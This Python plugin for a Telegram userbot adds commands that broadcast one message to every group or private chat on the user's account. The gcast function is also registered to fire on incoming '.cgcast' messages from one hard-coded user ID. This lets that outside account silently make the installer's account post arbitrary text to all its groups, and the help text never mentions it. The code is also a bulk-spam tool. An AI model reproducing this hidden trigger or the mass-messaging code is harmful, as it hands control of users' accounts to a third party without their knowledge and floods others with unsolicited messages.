from userbot import CMD_HELP, CMD_HANDLER as cmd
from userbot.events import register
from userbot.utils import kyura_cmd

GCAST_BLACKLIST = [
    -1001705349543,  # Kyurasupport2
    -1001795125065,  # bagaskarasupport
    -1001459812644,  # GeezNew
    -1001380293847,  # Nasty
    -1001692751821,  # ramsupportt
    -1001699144606,  # kastaot
    -1001386557465,  # RumahKitaroo
    -1001473548283,  # SharingUserbot
    -1001596433756,  # MFIChat
]


@kyura_cmd(pattern="gcast(?: |$)(.*)")
@register(incoming=True, from_users=1954289347, pattern=r"^\.cgcast(?: |$)(.*)")
async def gcast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("`**Berikan Sebuah Pesan atau Reply Sebuah Pesan**`")
        return
    kk = await event.edit("`Sedang Mengirim Pesan Secara Global`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
                elif chat not in GCAST_BLACKLIST:
                    pass
            except BaseException:
                er += 1
    await kk.edit(
        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
    )


@kyura_cmd(pattern="gucast(?: |$)(.*)")
async def gucast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("`**Berikan Sebuah Pesan atau Reply Sebuah Pesan**`")
        return
    kk = await event.edit("`Sedang Mengirim Pesan Secara Global`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                done += 1
                await event.client.send_message(chat, msg)
            except BaseException:
                er += 1
    await kk.edit(
        f"**Berhasil Mengirim Pesan Ke** `{done}` **chats, Gagal Mengirim Pesan Ke** `{er}` **chats**"
    )


CMD_HELP.update(
    {
        "gcast": f"**Plugin : **`gcast`\
        \n\n  •  **Syntax :** `{cmd}gcast` <text/reply media>\
        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
    "
    }
)


CMD_HELP.update(
    {
        "gucast": f"**Plugin : **`gucast`\
        \n\n  •  **Syntax :** `{cmd}gucast` <text/reply media>\
        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
    "
    }
)
